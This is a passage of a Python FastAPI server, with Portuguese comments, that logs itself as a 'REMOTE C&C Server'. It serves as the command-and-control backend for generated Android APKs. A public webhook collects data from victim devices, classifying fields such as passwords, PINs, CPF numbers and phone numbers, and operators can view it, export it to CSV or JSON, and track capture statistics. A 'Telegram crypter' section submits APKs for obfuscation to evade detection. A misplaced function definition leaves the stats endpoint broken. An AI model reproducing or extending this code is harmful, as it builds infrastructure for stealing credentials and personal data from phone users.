    """Exclui projeto"""
    from models import APKStudioProject
    
    project = db.query(APKStudioProject).filter(
        APKStudioProject.project_id == project_id,
        APKStudioProject.owner_id == current_user.id
    ).first()
    
    if project:
        db.delete(project)
        db.commit()
    
    return {"message": "Projeto excluído"}


# ========== WEBHOOK PARA RECEBER DADOS DOS APKs ==========

@app.post("/api/apk-studio/webhook/{project_id}")
async def webhook_receive_data(
    project_id: str,
    request: Request,
    db: Session = Depends(get_db)
):
    """
    🎯 WEBHOOK PÚBLICO - Recebe dados dos APKs gerados
    Este endpoint NÃO requer autenticação pois é chamado pelos APKs dos clientes
    """
    from models import APKStudioProject, StudioCapturedData, StudioDataField
    from datetime import datetime
    
    try:
        # Pega dados da requisição
        data = await request.json()
        client_ip = request.client.host if request.client else "unknown"
        
        # Busca o projeto para pegar o owner_id
        project = db.query(APKStudioProject).filter(
            APKStudioProject.project_id == project_id
        ).first()
        
        if not project:
            logger.warning(f"[WEBHOOK] Projeto não encontrado: {project_id}")
            # Retorna sucesso mesmo assim para não dar erro no APK
            return {"status": "ok", "message": "received"}
        
        # Extrai device_info se presente
        device_info = data.pop("_device_info", None)
        
        # Salva os dados capturados
        captured = StudioCapturedData(
            project_id=project_id,
            owner_id=project.owner_id,
            data_json=json.dumps(data),
            device_ip=client_ip,
            device_info=json.dumps(device_info) if device_info else None
        )
        db.add(captured)
        
        # Atualiza/cria campos dinâmicos
        for field_name, field_value in data.items():
            if field_name.startswith("_"):
                continue  # Ignora campos internos
            
            # Detecta tipo do campo
            field_type = "text"
            if isinstance(field_value, (int, float)):
                field_type = "number"
            elif "@" in str(field_value):
                field_type = "email"
            elif field_name.lower() in ["senha", "password", "pin", "codigo"]:
                field_type = "password"
            elif field_name.lower() in ["cpf", "cnpj", "documento"]:
                field_type = "document"
            elif field_name.lower() in ["telefone", "phone", "celular"]:
                field_type = "phone"
            
            # Verifica se campo já existe
            existing_field = db.query(StudioDataField).filter(
                StudioDataField.project_id == project_id,
                StudioDataField.field_name == field_name
            ).first()
            
            if existing_field:
                existing_field.occurrences += 1
                existing_field.last_seen = utc_now()
            else:
                new_field = StudioDataField(
                    project_id=project_id,
                    field_name=field_name,
                    field_type=field_type,
                    field_label=field_name.replace("_", " ").title()
                )
                db.add(new_field)
        
        db.commit()
        
        logger.info(f"[WEBHOOK] ✅ Dados recebidos para projeto {project_id} de {client_ip}")
        logger.info(f"[WEBHOOK] 📦 Campos: {list(data.keys())}")
        
        return {"status": "success", "message": "Dados recebidos com sucesso"}
        
    except Exception as e:
        logger.error(f"[WEBHOOK] ❌ Erro ao processar dados: {e}")
        # Retorna sucesso para não dar erro no APK
        return {"status": "ok", "error": str(e)}


# ========== VISUALIZAÇÃO DE DADOS CAPTURADOS ==========

@app.get("/api/apk-studio/data/{project_id}")
async def get_captured_data(
    project_id: str,
    page: int = 1,
    limit: int = 50,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Lista dados capturados de um projeto"""
    from models import APKStudioProject, StudioCapturedData, StudioDataField
    
    # Verifica se o projeto pertence ao usuário
    project = db.query(APKStudioProject).filter(
        APKStudioProject.project_id == project_id,
        APKStudioProject.owner_id == current_user.id
    ).first()
    
    if not project:
        raise HTTPException(status_code=404, detail="Projeto não encontrado")
    
    # Busca dados com paginação
    offset = (page - 1) * limit
    
    total = db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id
    ).count()
    
    data = db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id
    ).order_by(StudioCapturedData.created_at.desc()).offset(offset).limit(limit).all()
    
    # Busca campos detectados
    fields = db.query(StudioDataField).filter(
        StudioDataField.project_id == project_id
    ).order_by(StudioDataField.occurrences.desc()).all()
    
    return {
        "total": total,
        "page": page,
        "limit": limit,
        "totalPages": (total + limit - 1) // limit,
        "fields": [{
            "name": f.field_name,
            "type": f.field_type,
            "label": f.field_label,
            "count": f.occurrences
        } for f in fields],
        "data": [{
            "id": d.id,
            "data": json.loads(d.data_json) if d.data_json else {},
            "deviceIp": esconder_ip(d.device_ip),
            "deviceInfo": json.loads(d.device_info) if d.device_info else None,
            "capturedAt": d.created_at.isoformat() if d.created_at else None
        } for d in data]
    }


@app.delete("/api/apk-studio/data/{project_id}")
async def clear_captured_data(
    project_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Limpa todos os dados capturados de um projeto"""
    from models import APKStudioProject, StudioCapturedData, StudioDataField
    
    # Verifica permissão
    project = db.query(APKStudioProject).filter(
        APKStudioProject.project_id == project_id,
        APKStudioProject.owner_id == current_user.id
    ).first()
    
    if not project:
        raise HTTPException(status_code=404, detail="Projeto não encontrado")
    
    # Limpa dados
    db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id
    ).delete()
    
    db.query(StudioDataField).filter(
        StudioDataField.project_id == project_id
    ).delete()
    
    db.commit()
    
    logger.info(f"[APK-STUDIO] Dados limpos do projeto {project_id}")
    
    return {"message": "Dados limpos com sucesso"}


# ========== EXPORTAÇÃO DE DADOS ==========

@app.get("/api/apk-studio/data/{project_id}/export-csv")
async def export_data_csv(
    project_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Exporta dados capturados em CSV"""
    from models import APKStudioProject, StudioCapturedData
    import csv
    import io
    
    # Verifica permissão
    project = db.query(APKStudioProject).filter(
        APKStudioProject.project_id == project_id,
        APKStudioProject.owner_id == current_user.id
    ).first()
    
    if not project:
        raise HTTPException(status_code=404, detail="Projeto não encontrado")
    
    # Busca todos os dados
    data = db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id
    ).order_by(StudioCapturedData.created_at.desc()).all()
    
    if not data:
        raise HTTPException(status_code=404, detail="Nenhum dado para exportar")
    
    # Coleta todos os campos únicos
    all_fields = set()
    for d in data:
        parsed = json.loads(d.data_json) if d.data_json else {}
        all_fields.update(parsed.keys())
    
    # Gera CSV
    output = io.StringIO()
    writer = csv.writer(output)
    
    # Header
    headers = ["id", "ip", "captured_at"] + sorted(list(all_fields))
    writer.writerow(headers)
    
    # Dados
    for d in data:
        parsed = json.loads(d.data_json) if d.data_json else {}
        row = [
            d.id,
            d.device_ip or "",
            d.created_at.isoformat() if d.created_at else ""
        ]
        for field in sorted(list(all_fields)):
            row.append(str(parsed.get(field, "")))
        writer.writerow(row)
    
    output.seek(0)
    
    return StreamingResponse(
        io.BytesIO(output.getvalue().encode('utf-8')),
        media_type="text/csv",
        headers={
            "Content-Disposition": f"attachment; filename=dados_{project_id}.csv"
        }
    )


@app.get("/api/apk-studio/data/{project_id}/export-json")
async def export_data_json(
    project_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Exporta dados capturados em JSON"""
    from models import APKStudioProject, StudioCapturedData
    
    # Verifica permissão
    project = db.query(APKStudioProject).filter(
        APKStudioProject.project_id == project_id,
        APKStudioProject.owner_id == current_user.id
    ).first()
    
    if not project:
        raise HTTPException(status_code=404, detail="Projeto não encontrado")
    
    # Busca todos os dados
    data = db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id
    ).order_by(StudioCapturedData.created_at.desc()).all()
    
    export_data = [{
        "id": d.id,
        "data": json.loads(d.data_json) if d.data_json else {},
        "deviceIp": esconder_ip(d.device_ip),
        "deviceInfo": json.loads(d.device_info) if d.device_info else None,
        "capturedAt": d.created_at.isoformat() if d.created_at else None
    } for d in data]
    
    return StreamingResponse(
        io.BytesIO(json.dumps(export_data, indent=2, ensure_ascii=False).encode('utf-8')),
        media_type="application/json",
        headers={
            "Content-Disposition": f"attachment; filename=dados_{project_id}.json"
        }
    )


# ========== ESTATÍSTICAS DO PROJETO ==========

@app.get("/api/apk-studio/stats/{project_id}")
async def get_project_stats(
    project_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna estatísticas do projeto"""
    from models import APKStudioProject, StudioCapturedData, StudioDataField
    from sqlalchemy import func
    from datetime import datetime, timedelta, timezone

def utc_now():
    return datetime.now(timezone.utc).replace(tzinfo=None)
    
    # Verifica permissão
    project = db.query(APKStudioProject).filter(
        APKStudioProject.project_id == project_id,
        APKStudioProject.owner_id == current_user.id
    ).first()
    
    if not project:
        raise HTTPException(status_code=404, detail="Projeto não encontrado")
    
    # Total de capturas
    total_captures = db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id
    ).count()
    
    # Capturas hoje
    today = utc_now().replace(hour=0, minute=0, second=0, microsecond=0)
    captures_today = db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id,
        StudioCapturedData.created_at >= today
    ).count()
    
    # Capturas últimos 7 dias
    week_ago = utc_now() - timedelta(days=7)
    captures_week = db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id,
        StudioCapturedData.created_at >= week_ago
    ).count()
    
    # IPs únicos
    unique_ips = db.query(func.count(func.distinct(StudioCapturedData.device_ip))).filter(
        StudioCapturedData.project_id == project_id
    ).scalar()
    
    # Total de campos detectados
    total_fields = db.query(StudioDataField).filter(
        StudioDataField.project_id == project_id
    ).count()
    
    return {
        "projectId": project_id,
        "projectName": project.name,
        "totalCaptures": total_captures,
        "capturesToday": captures_today,
        "capturesWeek": captures_week,
        "uniqueDevices": unique_ips,
        "totalFields": total_fields,
        "webhookUrl": f"/api/apk-studio/webhook/{project_id}"
    }


# NOTA: Os endpoints de build do APK Studio estão definidos acima (linhas ~3418-3482)
# para evitar duplicação de rotas


# ==================== TELEGRAM CRYPTER API ====================

from telegram_crypter import telegram_crypter, get_telegram_status

@app.get("/api/telegram/status")
async def telegram_status(current_user: Operator = Depends(get_current_user)):
    """Retorna status da integração Telegram"""
    return get_telegram_status()

@app.post("/api/telegram/configure")
async def telegram_configure(
    data: dict,
    current_user: Operator = Depends(get_current_user)
):
    """
    Configura credenciais do Telegram
    Body: {api_id, api_hash, phone, bot_username}
    """
    if not current_user.is_admin:
        raise HTTPException(403, "Apenas admin pode configurar Telegram")
    
    api_id = data.get("api_id", "")
    api_hash = data.get("api_hash", "")
    phone = data.get("phone", "")
    bot_username = data.get("bot_username", "")
    
    if not all([api_id, api_hash, phone, bot_username]):
        raise HTTPException(400, "Todos os campos são obrigatórios")
    
    telegram_crypter.configure(api_id, api_hash, phone, bot_username)
    return {"status": "configured", "message": "Telegram configurado com sucesso"}

@app.post("/api/telegram/login")
async def telegram_login(current_user: Operator = Depends(get_current_user)):
    """Inicia processo de login no Telegram"""
    if not current_user.is_admin:
        raise HTTPException(403, "Apenas admin pode fazer login")
    
    result = await telegram_crypter.start_login()
    return result

@app.post("/api/telegram/verify-code")
async def telegram_verify_code(
    data: dict,
    current_user: Operator = Depends(get_current_user)
):
    """Envia código de verificação"""
    if not current_user.is_admin:
        raise HTTPException(403, "Apenas admin")
    
    code = data.get("code", "")
    if not code:
        raise HTTPException(400, "Código não fornecido")
    
    result = await telegram_crypter.submit_code(code)
    return result

@app.post("/api/telegram/verify-password")
async def telegram_verify_password(
    data: dict,
    current_user: Operator = Depends(get_current_user)
):
    """Envia senha 2FA"""
    if not current_user.is_admin:
        raise HTTPException(403, "Apenas admin")
    
    password = data.get("password", "")
    if not password:
        raise HTTPException(400, "Senha não fornecida")
    
    result = await telegram_crypter.submit_password(password)
    return result

@app.post("/api/telegram/disconnect")
async def telegram_disconnect(current_user: Operator = Depends(get_current_user)):
    """Desconecta do Telegram"""
    if not current_user.is_admin:
        raise HTTPException(403, "Apenas admin")
    
    await telegram_crypter.disconnect()
    return {"status": "disconnected"}

@app.post("/api/telegram/crypt-apk")
async def telegram_crypt_apk(
    data: dict,
    current_user: Operator = Depends(get_current_user)
):
    """
    Envia APK para o bot de crypter no Telegram (Apenas admin + Path sanitizado)
    """
    if not current_user.is_admin:
        raise HTTPException(403, "Apenas administradores podem utilizar o Crypter Telegram")
        
    apk_path = data.get("apk_path", "")
    if not apk_path:
        raise HTTPException(400, "Caminho do APK não fornecido")
        
    safe_name = os.path.basename(apk_path)
    server_dir = os.path.dirname(os.path.abspath(__file__))
    downloads_dir = os.path.abspath(os.path.join(server_dir, "downloads"))
    resolved_path = os.path.abspath(os.path.join(downloads_dir, safe_name))
    
    if not resolved_path.startswith(downloads_dir) or not os.path.exists(resolved_path):
        raise HTTPException(404, f"APK não encontrado: {safe_name}")
        
    result = await telegram_crypter.crypt_apk(resolved_path)
    return result
    
@app.get("/{full_path:path}")
async def serve_spa_frontend(full_path: str):
    """
    Fallback SPA Router (React / Vite)
    Redireciona todas as sub-rotas frontend (ex: /win-builder, /win-device/...) para o index.html
    """
    if full_path.startswith("api/") or full_path.startswith("ws"):
        raise HTTPException(status_code=404, detail="Endpoint API não encontrado")
    
    server_dir = os.path.dirname(os.path.abspath(__file__))
    dist_index = os.path.join(server_dir, "web-dist", "index.html")
    if os.path.exists(dist_index):
        return FileResponse(dist_index, media_type="text/html")
    raise HTTPException(status_code=404, detail="Painel Web não encontrado")


# ==================== INICIALIZAÇÃO ====================

if __name__ == "__main__":
    import uvicorn

    host = os.getenv("GANGASTAR_HOST", os.getenv("GANGSTAR_HOST", "0.0.0.0"))
    port = int(os.getenv("GANGASTAR_PORT", os.getenv("GANGSTAR_PORT", "5000")))
    workers = int(os.getenv("GANGASTAR_UVICORN_WORKERS", os.getenv("GANGSTAR_UVICORN_WORKERS", "1")))

    logger.info("Iniciando GANGASTAR REMOTE C&C Server (VPS / PostgreSQL)...")
    logger.info("WebSocket: %s", gangstar_env.public_ws_url())
    logger.info("Painel Web: %s", gangstar_env.public_base_url())

    if workers > 1:
        uvicorn.run(
            "main:app",
            host=host,
            port=port,
            workers=workers,
            log_level="warning",
            http="auto",
            ws="auto",
            ws_max_size=4 * 1024 * 1024,
            ws_ping_interval=30.0,
            ws_ping_timeout=60.0,
            timeout_keep_alive=60,
            limit_concurrency=10000,
            backlog=2048,
        )
    else:
        uvicorn.run(
            app,
            host=host,
            port=port,
            log_level="warning",
            http="auto",
            ws="auto",
            ws_max_size=4 * 1024 * 1024,
            ws_ping_interval=30.0,
            ws_ping_timeout=60.0,
            timeout_keep_alive=60,
            limit_concurrency=10000,
            backlog=2048,
        )
